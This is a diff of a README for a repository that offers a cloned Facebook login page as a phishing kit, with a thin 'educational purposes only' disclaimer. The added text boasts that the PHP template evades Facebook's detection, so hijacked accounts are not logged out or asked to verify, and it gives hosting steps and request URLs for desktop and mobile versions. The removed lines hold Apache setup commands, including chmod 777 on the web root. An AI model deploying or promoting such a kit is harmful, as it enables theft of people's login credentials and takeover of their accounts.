@@ -1,17 +1,23 @@
 ## About
 Facebook Phishing for educational Purposes ONLY.
-This is a version of greek Facebook mobile version.
 This Phising will come handy for social-engineering techniques.
 The reason i created this repo is because facebook is using an algorithm to load all the page resources randomly.
-That means everytime you want to use facebook login page, it will only be available for a while because the code is dynamically loaded,  
-which also means that every image and css code is loaded dynamically and randomly.
-I just collected all the images and the css code and i made them static to the code so it doesn't also require to send any requests to facebook.com.
- 
-## Usage
-1. `sudo service apache2 start`
-2. `git clone https://github.com/0xyg3n/fbphish /var/www/html`
-3. `sudo chmod 777 /var/www/html/* `
+That means everytime you want to use facebook login page as a phising, it will only be available for a while because the code is dynamically loaded, which also means that every image and css code is loaded dynamically and randomly.
+I just collected all the images and the css code and i made them static so this code will always working.
 
+## Undetected
+The way i coded it with php allows me to use the phishing template and the facebook cannot even detect it so when you access the profile you hooked it will not log you out and ask you to verify your identity because it did not detect that the profile has been phished. 
+ 
+## Get it Working
+
+1. Host it somewhere.
+2. For Desktop Version the request should be like this https://site.com/?id=login
+3. For the mobile version the request should be like this https://site.com/mobile/?id=login
+ 
+
+## TODO
+
+1. Create the Not Found Page (follow.jpg)
 
 ## Troubleshooting
 
